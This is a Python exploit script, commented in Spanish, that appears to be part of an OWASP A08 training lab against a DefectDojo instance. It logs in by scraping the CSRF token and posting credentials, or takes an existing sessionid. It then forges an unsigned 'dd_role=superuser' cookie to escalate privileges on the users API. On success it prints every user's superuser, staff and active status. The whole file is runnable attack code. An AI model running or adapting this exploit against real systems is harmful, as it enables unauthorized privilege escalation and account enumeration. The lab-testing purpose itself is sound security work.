"""
A08:2025 — Vuln 2: Cookie sin verificación de integridad (CWE-565 / CWE-784)

El middleware UserRoleCookieMiddleware eleva privilegios basándose en el
valor de la cookie dd_role sin ninguna firma ni validación criptográfica.

Uso:
    python A08_V2.py --host http://<HOST> --user <USER> --password <PASS>
    python A08_V2.py --host http://<HOST> --session <SESSIONID>
"""

import argparse
import http.cookiejar
import json
import re
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Helpers HTTP (sin dependencias externas)
# ---------------------------------------------------------------------------

def _make_opener(jar: http.cookiejar.CookieJar) -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def _get(url: str, opener: urllib.request.OpenerDirector) -> tuple[int, bytes]:
    """GET siguiendo redirects; las cookies se gestionan en el opener."""
    req = urllib.request.Request(url, method="GET")
    try:
        with opener.open(req) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def _get_plain(url: str, cookies: dict) -> tuple[int, bytes]:
    """GET simple con cookies manuales (para el exploit, sin CookieJar)."""
    headers = {"Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())}
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def _post_form(url: str, data: dict,
               opener: urllib.request.OpenerDirector) -> tuple[int, bytes]:
    """POST form-urlencoded; cookies gestionadas por el opener (CookieJar)."""
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": url},
        method="POST",
    )
    try:
        with opener.open(req) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


# ---------------------------------------------------------------------------
# Flujo de login
# ---------------------------------------------------------------------------

def login(host: str, username: str, password: str) -> str:
    """
    Realiza el login contra DefectDojo y devuelve el sessionid.
    Usa CookieJar para capturar cookies en todos los saltos de redirect.
    """
    login_url = f"{host.rstrip('/')}/login"
    jar = http.cookiejar.CookieJar()
    opener = _make_opener(jar)

    # Paso 1 — GET /login: recoge csrftoken cookie + token del form
    print("[*] GET /login para obtener CSRF token...")
    _, body = _get(login_url, opener)
    html = body.decode(errors="replace")

    m = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', html)
    if not m:
        raise RuntimeError("No se encontró csrfmiddlewaretoken en el formulario de login")
    csrf_token = m.group(1)
    print(f"[+] csrfmiddlewaretoken: {csrf_token[:10]}...")

    # Paso 2 — POST /login: CookieJar envía csrftoken y recoge sessionid
    print(f"[*] POST /login como '{username}'...")
    _post_form(
        login_url,
        {"username": username, "password": password, "csrfmiddlewaretoken": csrf_token},
        opener,
    )

    for cookie in jar:
        if cookie.name == "sessionid":
            print(f"[+] sessionid obtenido: {cookie.value[:10]}...")
            return cookie.value

    raise RuntimeError("Login fallido — no se recibió sessionid (verifica credenciales)")


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(host: str, session_id: str) -> None:
    host = host.rstrip("/")
    endpoint = f"{host}/api/v2/users/?format=json"

    print("\n" + "=" * 60)
    print("VULN 2 — Cookie sin integridad (CWE-565 / CWE-784)")
    print("=" * 60)

    # Paso 1 — sin cookie maliciosa
    print("\n[1] Acceso SIN cookie dd_role (rol real del usuario):")
    status, body = _get_plain(endpoint, {"sessionid": session_id})
    if status == 200:
        d = json.loads(body)
        print(f"    HTTP 200 — {d['count']} usuarios visibles (inesperado para rol normal)")
    elif status == 403:
        print(f"    HTTP 403 — Acceso denegado (comportamiento esperado)")
    else:
        print(f"    HTTP {status}")

    # Paso 2 — con cookie maliciosa
    print("\n[2] Acceso CON dd_role=superuser (exploit):")
    status, body = _get_plain(endpoint, {"sessionid": session_id, "dd_role": "superuser"})
    if status == 200:
        d = json.loads(body)
        print(f"    HTTP 200 — {d['count']} usuarios visibles ← ESCALADA EXITOSA")
        print()
        print(f"    {'Usuario':<22} {'Superuser':<12} {'Staff':<10} {'Activo'}")
        print(f"    {'-'*22} {'-'*12} {'-'*10} {'-'*6}")
        for u in d["results"]:
            print(
                f"    {u['username']:<22} "
                f"{str(u.get('is_superuser')):<12} "
                f"{str(u.get('is_staff')):<10} "
                f"{u.get('is_active')}"
            )
    else:
        print(f"    HTTP {status} — exploit no funcionó (verifica que el middleware esté activo)")

    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit Vuln 2 — Cookie sin integridad"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--session", metavar="SESSIONID",
                       help="Usar un sessionid existente directamente")
    group.add_argument("--user", metavar="USERNAME",
                       help="Usuario para login automático (requiere --password)")
    parser.add_argument("--password", metavar="PASSWORD",
                       help="Contraseña para login automático")
    args = parser.parse_args()

    if args.user and not args.password:
        parser.error("--user requiere --password")

    if args.session:
        session_id = args.session
    else:
        session_id = login(args.host, args.user, args.password)

    exploit(args.host, session_id)
